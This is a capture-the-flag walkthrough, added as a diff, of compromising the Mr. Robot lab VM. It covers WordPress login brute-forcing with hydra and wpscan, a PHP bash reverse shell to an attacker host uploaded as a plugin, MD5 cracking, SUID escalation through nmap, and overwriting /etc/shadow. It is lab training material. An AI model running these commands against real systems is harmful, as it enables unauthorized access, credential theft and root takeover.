@@ -1,0 +1,102 @@
+
+┌──(kali㉿kali)-[~/mosint]
+└─$ nmap -sC -sV 192.168.1.59
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-16 13:47 CEST
+Nmap scan report for 192.168.1.59 (192.168.1.59)
+Host is up (0.0020s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   ssl/http Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+
+------------------------------------------------------------------------
+With OwaspZap we found robots.txt file and inside it there was two files
+"key-1-of-3.txt --> it would seem the first flag" and 
+"fsocity.dic --> it would seem wordlist file" 
+
+#1 Flag : 073403c8a58a1f80d943455fb30724b9
+------------------------------------------------------------------------
+
+With the word list fsocity.dic we try to enumerate the username by the 
+form in wp-login.php 
+
+#hydra -L ./Scaricati/fsocity.dic -P ./test.txt 192.168.1.59 -V http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid"
+#[80][http-post-form] host: 192.168.1.59   login: Elliot   password: password
+
+Now we have the correct username we try to run wpscan for find something necessary
+#wpscan -t 10000 -U Elliot -P ./Scaricati/fsocity.dic --url http://192.168.1.59
+
+#[!] Valid Combinations Found:
+# | Username: Elliot, Password: ER28-0652
+
+------------------------------------------------------------------------
+
+Now with the access as Administrator we can upload a reverse shell to get the control
+we can do this by a simple string of connection in php, 
+#exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.56/4343 0>&1'");
+we zip the file and we uploat it as a plugin, after we activate the plugin and volià
+
+┌──(kali㉿kali)-[~/Scrivania]
+└─$ nc -lnvp 4343                                               
+listening on [any] 4343 ...
+connect to [192.168.1.56] from (UNKNOWN) [192.168.1.59] 42991
+bash: cannot set terminal process group (2380): Inappropriate ioctl for device
+bash: no job control in this shell
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-admin$
+
+-----------------------------------------------------------------------
+
+Now with the reverse shell firt we would like to have a tty shell so:
+#python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+After done this we found two file in /home/robot that are interesting
+"key-2-of-3.txt  password.raw-md5" but we don't have permission to open the key
+we can only open the password file.
+#robot:c3fcd3d76192e4007dfb496cca67e13b
+
+with a md5-decripter tool : abcdefghijklmnopqrstuvwxyz
+
+and now we try to login with this credentials.
+#############################################
+$ su - robot
+su - robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+$ whoami
+whoami
+robot
+#############################################
+
+We are able to read the second Flag!
+#2 Flag : 822c73956184f694993bede3eb39f959
+
+-----------------------------------------------------------------------
+
+Now with the user robot we try to SUID for the previledge escalation 
+#find / -perm -u=s -type f 2>/dev/null
+And in the output there is the possibility to adopt nmap by doing this
+#nmap --interactive
+#nmap> !sh
+
+And now we are root!
+
+Since we can read the /etc/shadow file we clone the original one changing
+the root password with the robot user password, and we simply copy it in the path : 
+#cp shadow(clone) /etc/shadow
+
+And now we have access to root.
+
+Username : root
+Password : abcdefghijklmnopqrstuvwxyz
+
+#3 Flag : 04787ddef27c3dee1ee161b21670b4e4
+
+-----------------------------------------------------------------------
